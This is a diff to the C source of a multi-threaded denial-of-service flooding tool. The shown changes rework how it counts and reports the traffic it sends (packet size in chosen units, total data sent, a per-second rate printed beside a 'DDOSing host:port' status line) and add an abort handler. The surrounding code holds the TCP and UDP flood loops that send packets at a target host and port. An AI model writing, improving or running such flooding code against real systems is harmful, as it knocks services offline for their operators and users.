@@ -9,22 +9,34 @@
 #include "ddos.h"
 #include "util.h"
 
-#include <math.h>
+#include <math.h>//pow
 
-int64_t pc;
+#ifndef DOUBLE_MAX
+#define DOUBLE_MAX 0.0
+#endif
+
+
+
+double psent;
 char* __host;
 int __port;
 int tcount = 0;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 bool status;
+uint8_t metrics;
+double psize;//one packet size in selected metrics
 
 bool __run;
+uint64_t pc;//Now it used for speed counting
 bool use_dos_sleep;
 int dos_sleep;
 
-int64_t plen;//packet length
+int64_t plen;//packet length in bytes
 clock_t tm;//last time stat update
 int64_t pc_old;//packets count on last stat update
+char *smetrics;
+double psent_old;
+
 void __exit()
 {
     __run = false;
@@ -32,10 +44,19 @@ void __exit()
     fflush(stdout);
     printf("%c[2K", 27);
     printf("\r");
-    success("Total data sent:%s",bytes2mb(pc*plen));
+    success("Total data sent:%.2f%s",psent,smetrics);
     info("Quitting...");
     pthread_mutex_unlock(&mutex);
     exit(0);
+}
+void __perror(){//for debugging
+    __run = false;
+    pthread_mutex_lock(&mutex);
+    printf("%c[2K", 27);
+    printf("\r");
+    error("Programming error:Abort trap(6):maybe type overflow?");
+    pthread_mutex_unlock(&mutex);
+    exit(-1);
 }
 void _ddos_tcp(char* host, int port, char* packet)
 {
@@ -83,6 +104,7 @@ void _ddos_tcp(char* host, int port, char* packet)
             }
         }
         if(status){//we are displaying status so we need to count packets
+            psent+=psize;
             pc++;
         }
     }
@@ -113,6 +135,7 @@ void _ddos_udp(char* host, int port, char* packet)
         }
         dos_udp_send(sock, host, port, packet, buf, bufsize);
         if(status){
+            psent+=psize;
             pc++;
         }
     }
@@ -126,12 +149,12 @@ void _ddos_stat()//update stat
     for (;;) {
         clock_t now=clock();
         double delta_t=(double)(now - tm) / CLOCKS_PER_SEC;//time diff
-        double delta_p=pc-pc_old;//packets diff
-        double delta_mb=(delta_p*plen)/pow(1024.0,2);
+        double delta_p=psent-psent_old;
         if (!__run) {
             break;
         }
-        success_n("DDOSing %s:%d;Packets sent:%s,thread count:%d,%.2fMb/s\r", __host, __port, bytes2mb(pc*plen), tcount,delta_mb*(1/delta_t));
+        success_n("DDOSing %s:%d;Packets sent:%.2f %s,thread count:%d,%.2f%s/s\r", __host, __port, psent,smetrics, tcount,delta_p/delta_t,smetrics);
+        pc=0;
     }
 }
 _dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
@@ -156,14 +179,21 @@ void __ddos_wrapper(_dos_param* x)
 }
 void ddos(char* host, int port, char* packet, int _tcount, int mode)
 {
-    pc = 0;
-    plen=strlen(packet);
-    __run = true;
     signal(SIGPIPE, SIG_IGN);
     signal(SIGINT, __exit);
+    signal(SIGABRT, __perror);
+    
+    pc = 0;
+    plen=strlen(packet);
+    psize=plen/pow(1024.0,metrics);
+    __run = true;
+    smetrics=metrics2str(metrics);
     __host = host;
     __port = port;
+    psent_old=0.0;
+    psent=0.0;
     _dos_param* p = _init_dos_p(host, port, packet, mode);
+    
     pthread_t* _ddos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
     // pthread_mutex_init(&mutex, NULL);
     if(status){
